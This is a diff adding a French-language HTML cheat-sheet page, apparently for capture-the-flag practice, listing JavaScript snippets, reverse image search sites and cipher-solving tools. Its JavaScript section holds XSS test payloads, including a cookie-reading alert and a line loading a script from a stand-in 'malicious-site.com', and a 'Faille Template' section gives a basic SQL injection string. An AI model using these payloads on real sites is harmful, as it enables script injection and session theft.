@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheat Sheet</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Cheat Sheet</h1>
+        <input type="text" id="search" placeholder="Rechercher une commande...">
+    </header>
+    <main>
+        <section class="cheat-section" id="javascript">
+            <h2>JavaScript</h2>
+            <ul>
+                <li>console.log('message'); - <b>Affiche un message dans la console</b></li>
+                <br>
+                <li>document.getElementById('id'); - <b>Sélectionne un élément par son ID</b></li>
+                <br>
+                <li>alert('XSS') - <b>Affiche une alerte</b></li>
+                <br>
+                <li>alert(document.cookie) - <b>Affiche le cookie </b></li>
+                <br>
+                <li>document.getElementById('target').innerHTML = '<.h1>Hacked!<./h1>' - <b>Manipulation DOM</b></li>
+                <br>
+                <li>var script = document.createElement('script');
+                    script.src = 'http://malicious-site.com/malicious.js';
+                    document.body.appendChild(script) - <b>Ajout d'un script malveillant</b></li>
+                <br>
+                <li>document.onkeydown = function(e) {
+                    if (e.keyCode === 123) { // F12
+                        return false;
+                    }
+                    if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) {
+                        return false;
+                    }
+                }; - <b>Bypasss F12</b>
+                </li>
+                <br>
+                <li>console.log(Object.getOwnPropertyNames(window)) - <b>les APIs disponible sur un site</b></li>
+                
+            </ul>
+        </section>
+
+        <section class="cheat-section" id="reverse-search">
+            <h2>Recherche inversée</h2>
+            <ul>
+                <li><a href="http://web.archive.org/" target="_blank">WBM</a></li>
+                <br>
+                <li><a href="https://yandex.com/images/" target="_blank">YANDEX IMAGE</a></li>
+                <br>
+                <li><a href="https://images.google.com/" target="_blank">GOOGLE IMAGE</a></li>
+                <br>
+                <li><a href="https://smallseotools.com/fr/reverse-image-search/" target="_blank">SEOTOOLS</a></li>
+                <br>
+                <li><a href="https://tineye.com/" target="_blank">TINEYE</a></li>
+                <br>
+                <li><a href="https://www.labnol.org/reverse/" target="_blank">LABNOL</a></li>
+                <br>
+            </ul>
+        </section>
+
+        <section class="cheat-section" id="vulnerability">
+            <h2>Faille Template</h2>
+            <ul>
+                <li>SQL Injection -  ‘bob’ or 1=1 --</li>
+            </ul>
+        </section>
+
+        <section class="cheat-section" id="tools">
+            <h2>Tools</h2>
+            <ul>
+                <li><a href="https://tio.run/" target="_blank">TIO RUN</a></li>
+                <br>
+                <li><a href="https://morsecode.world/international/translator.html" target="_blank">MORSE CODE</a></li>
+                <br>
+                <li><a href="https://camo.githubusercontent.com/6ba469e485eef71282e115f9caf860b9c165ab646ec67bc6e5550b01b6286267/68747470733a2f2f656e637279707465642d74626e302e677374617469632e636f6d2f696d616765733f713d74626e3a414e643947635153795378486a4d4676383058577037344c5a7066726e41726f3661314d4c7165463146337a706775413550475357396f76" target="_blank">PHONE STRING</a></li>
+                <br>
+                <li><a href="https://www.dcode.fr/keyboard-shift-cipher" target="_blank">KEYBOARD SHIFT</a></li>
+                <br>
+                <li><a href="https://rumkin.com/tools/cipher/atbash/" target="_blank">ATBASH</a></li>
+                <br>
+                <li><a href="https://www.guballa.de/vigenere-solver" target="_blank">VIGENERE SOLVER</a></li>
+                <br>
+                <li><a href="https://www.dcode.fr/beaufort-cipher" target="_blank">BEAUFORT CIPHER SOLVER</a></li>
+                <br>
+                <li><a href="https://quipqiup.com/" target="_blank">SUBSTITUTION CIPHER SOLVER</a></li>
+                <br>
+                <li><a href="https://rumkin.com/tools/cipher/rail-fence/" target="_blank">RAIL FENCE SOLVER</a></li>
+                <br>
+                <li><a href="http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html" target="_blank">PLAYFAIR CIPHER SOLVER</a></li>
+                <br>
+                <li><a href="https://www.braingle.com/brainteasers/codes/polybius.php" target="_blank">POLYBIUS SQUARE</a></li>
+                <br>
+                <li><a href="https://hexed.it/" target="_blank">HEXED TOOL (HEXADECIMAL TOOL)</a></li>
+                <br>
+                <li><a href="https://www.dcode.fr/enigma-machine-cipher" target="_blank">ENIGMA CIPHER SOLVER</a></li>
+                <br>
+                <li><a href="https://www.dcode.fr/enigma-machine-cipher" target="_blank">ENIGMA CIPHER SOLVER</a></li>
+                <br>
+                <li><a href="https://www.dcode.fr/enigma-machine-cipher" target="_blank">ENIGMA CIPHER SOLVER</a></li>
+            </ul>
+        </section>
+    </main>
+    <script src="script.js"></script>
+</body>
+</html>
